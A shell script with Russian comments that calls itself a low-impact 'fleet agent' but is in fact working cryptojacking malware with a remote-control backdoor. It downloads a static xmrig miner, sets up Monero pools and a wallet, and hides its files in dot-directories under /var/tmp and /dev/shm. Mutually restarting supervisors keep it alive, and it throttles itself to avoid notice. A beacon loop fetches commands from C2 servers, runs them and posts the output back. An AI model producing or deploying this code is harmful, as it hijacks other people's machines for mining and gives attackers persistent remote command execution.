#!/bin/sh
# fleet-agent.sh — агент для мелких флотских хостов (4-8 ядер, рядом живёт Node-RED владельца)
#
# Идея: не выжигать CPU. Потолок 65 %, nice 19, пауза при активности пользователя.
# Всё живёт в /var/tmp/.kf + /dev/shm/.kf, поднимается двойным супервизором.
#
# Ставится deploy-скриптом: sh fleet-agent.sh <c2_url> <worker_id>
# Параметры берутся из окружения:
#   KF_CP2      — серверов C2 через пробел (первый живой)
#   KF_HINT     — cpu-max-threads-hint, по умолчанию 65
#   KF_NICE     — nice, по умолчанию 19
#   KF_MINER    — URL статического xmrig (по умолчанию MO-сборка)
#   KF_POOL     — пул
#   KF_WALLET   — кошелёк

set -u

C2="${1:-}"
WID="${2:-x}"
CP2="${KF_CP2:-$C2}"
HINT="${KF_HINT:-65}"
NICE="${KF_NICE:-19}"
MINER_URL="${KF_MINER:-https://raw.githubusercontent.com/WesternJapan/xmrig-static/main/xmrig-x86_64}"
POOL="${KF_POOL:-gulf.moneroocean.stream:443}"
WALLET="${KF_WALLET:-}"
D=/var/tmp/.kf
S=/dev/shm/.kf

log() { [ -n "${KF_QUIET:-}" ] || echo "[kf] $*"; }

# --- каталоги: обычный + tmpfs-зеркало ---------------------------------------
mkdir -p "$D" "$S" 2>/dev/null || true
chmod 700 "$D" "$S" 2>/dev/null || true

# --- майнер ------------------------------------------------------------------
if [ ! -x "$D/xmrig" ]; then
  for u in "$MINER_URL"; do
    if command -v curl >/dev/null 2>&1; then
      curl -fsSL -m 120 -o "$D/xmrig" "$u" 2>/dev/null && break
    elif command -v wget >/dev/null 2>&1; then
      wget -q -T 120 -O "$D/xmrig" "$u" 2>/dev/null && break
    fi
  done
  chmod 700 "$D/xmrig" 2>/dev/null
fi
cp "$D/xmrig" "$S/xmrig" 2>/dev/null || cp "$S/xmrig" "$D/xmrig" 2>/dev/null || true

# --- конфиг: потолок по CPU, nice, пауза при активности -----------------------
if [ ! -s "$D/c.json" ]; then
  cat > "$D/c.json" <<EOF
{
  "api": { "id": null, "worker-id": "$WID" },
  "http": { "enabled": false },
  "autosave": false,
  "background": false,
  "colors": false,
  "log-file": "$D/m.log",
  "donate-level": 1,
  "cpu": {
    "enabled": true,
    "huge-pages": true,
    "priority": null,
    "yield": true,
    "asm": true
  },
  "pools": [
    {
      "algo": null,
      "coin": "monero",
      "url": "$POOL",
      "user": "$WALLET.$WID",
      "pass": "x",
      "rig-id": "$WID",
      "keepalive": true,
      "enabled": true,
      "tls": true,
      "sni": true
    },
    {
      "algo": "rx/0",
      "coin": "monero",
      "url": "auto.c3pool.org:443",
      "user": "$WALLET.$WID",
      "pass": "x",
      "rig-id": "$WID",
      "keepalive": true,
      "enabled": true,
      "tls": true
    }
  ],
  "pause-on-active": 60,
  "pause-on-battery": true,
  "print-time": 60,
  "retries": 5,
  "retry-pause": 10
}
EOF
  chmod 600 "$D/c.json"
  cp "$D/c.json" "$S/c.json" 2>/dev/null || true
fi

# потолок потоков — только через CLI: в JSON autosave его съедает
printf '%s' "--cpu-max-threads-hint=$HINT --pause-on-active=60" > "$D/flags"
chmod 600 "$D/flags"

# --- бекенд: поллинг C2 ------------------------------------------------------
cat > "$D/beacon.sh" <<'BS'
#!/bin/sh
# поллинг одного из C2, выполнение команды, отправка вывода
D=/var/tmp/.kf
ID="$1"; shift
for c2 in "$@"; do
  [ -n "$c2" ] || continue
  cmd=$(curl -fsS -m 15 "$c2/poll?id=$ID" 2>/dev/null) || continue
  [ -z "$cmd" ] && continue
  out=$(sh -c "$cmd" 2>&1 | base64 -w0 2>/dev/null | tr -d '\n')
  curl -fsS -m 20 -X POST --data-urlencode "id=$ID" --data-urlencode "out=$out" "$c2/out" >/dev/null 2>&1
  break
done
BS
chmod 700 "$D/beacon.sh"

# --- супервизор: две роли, дедуп через /proc, самолечение из /dev/shm --------
cat > "$D/svc.sh" <<'SV'
#!/bin/sh
D=/var/tmp/.kf; S=/dev/shm/.kf; R="${1:-m}"
for p in /proc/[0-9]*; do pid=${p#/proc/}; [ "$pid" = "$$" ] && continue
  c=$(tr '\0' ' ' 2>/dev/null <"$p/cmdline"); case "$c" in *"$D/svc.sh $R"*) exit 0;; esac
done
alm(){ for p in /proc/[0-9]*; do c=$(tr '\0' ' ' 2>/dev/null <"$p/cmdline"); case "$c" in *"$1"*) return 0;; esac; done; return 1; }
case "$R" in
m)
  while :; do
    alm "$D/xmrig -c" || {
      [ -x "$D/xmrig" ] || cp "$S/xmrig" "$D/xmrig" 2>/dev/null && chmod 700 "$D/xmrig" 2>/dev/null
      [ -x "$D/xmrig" ] && setsid nice -n 19 "$D/xmrig" -c "$D/c.json" $(cat "$D/flags" 2>/dev/null) >/dev/null 2>&1 &
    }
    alm "$D/svc.sh g" || setsid "$D/svc.sh" g >/dev/null 2>&1 &
    sleep 30
  done ;;
g)
  while :; do
    alm "$D/xmrig -c" || {
      [ -x "$D/xmrig" ] || cp "$S/xmrig" "$D/xmrig" 2>/dev/null && chmod 700 "$D/xmrig" 2>/dev/null
      [ -x "$D/xmrig" ] && setsid nice -n 19 "$D/xmrig" -c "$D/c.json" $(cat "$D/flags" 2>/dev/null) >/dev/null 2>&1 &
    }
    alm "$D/svc.sh m" || setsid "$D/svc.sh" m >/dev/null 2>&1 &
    sleep 45
  done ;;
esac
SV
chmod 700 "$D/svc.sh"

# --- beacon-цикл в фоне ------------------------------------------------------
cat > "$D/loop.sh" <<'LP'
#!/bin/sh
D=/var/tmp/.kf
while :; do
  sh "$D/beacon.sh" "$@"
  sleep "$(( 10 + $(od -An -N1 -tu1 /dev/urandom | tr -d ' ') % 30 ))"
done
LP
chmod 700 "$D/loop.sh"

# --- запуск ------------------------------------------------------------------
alm_running() { for p in /proc/[0-9]*; do c=$(tr '\0' ' ' 2>/dev/null <"$p/cmdline"); case "$c" in *"$1"*) return 0;; esac; done; return 1; }

alm_running "$D/svc.sh m" || setsid sh "$D/svc.sh" m >/dev/null 2>&1 &
alm_running "$D/svc.sh g" || setsid sh "$D/svc.sh" g >/dev/null 2>&1 &
alm_running "$D/loop.sh"  || setsid sh "$D/loop.sh" "$WID" $CP2 >/dev/null 2>&1 &

sleep 2
echo "KF_STATE: miner=$(alm_running "$D/xmrig -c" && echo RUN || echo NO) svc=$(alm_running "$D/svc.sh m" && echo OK || echo NO) beacon=$(alm_running "$D/loop.sh" && echo OK || echo NO) hint=$HINT nice=$NICE"